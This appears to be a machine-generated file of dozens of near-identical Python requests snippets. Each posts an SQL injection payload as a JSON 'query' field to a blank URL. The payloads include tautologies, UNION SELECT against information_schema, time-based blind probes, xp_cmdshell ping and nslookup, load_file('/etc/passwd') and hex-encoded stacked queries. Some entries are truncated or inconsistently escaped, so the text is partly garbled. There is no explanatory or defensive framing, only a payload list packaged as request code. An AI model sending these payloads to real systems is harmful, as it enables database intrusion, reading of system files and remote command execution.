'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1 in \x28select var from temp\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '7659'='7659\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'text' = n'text'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x28200\x29 select \x40s = 0x73656c6 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec xp\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; exec master..xp_cmdshell 'ping 172.10.1.255'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x223.10E+17\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND email IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22&\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'unusual' = 'unusual'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22//\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22truncate\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x27UNION SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x28200\x29 select \x40s = 0x77616974 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22tz_offset\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22sqlvuln\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22));waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||6\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or%201=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%28%7C%28objectclass%3D%2A%29%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 union select * from information_schema.tables;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22PRINT \x40\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or isNULL\x281/0\x29 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2226 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22a\\x22=\\x22a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28sqlvuln\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND members.email IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1=\x28 if\x28\x28load_file\x28char\x28110,46,101,120,11 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x770061006900740066006F0072002000640065006C00 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20'sleep%2050'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22as\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22/**/or/**/1/**/=/**/1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union all select \x40\x40version--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22,\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28sqlattempt2\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or \x28EXISTS\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22t'exec master..xp_cmdshell 'nslookup www.googl ...\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20$\x28sleep%2050\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20or%20''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||UTL_HTTP.REQUEST\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 'x'='x';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or sleep\x28__TIME__\x29=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'whatever' in ('whatever')\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; begin declare @var varchar(8000) set @var=' ...\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22union select 1,load_file('/etc/passwd'),1,1,1;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x77616974666F722064656C61792027303A303A313027 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union select\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
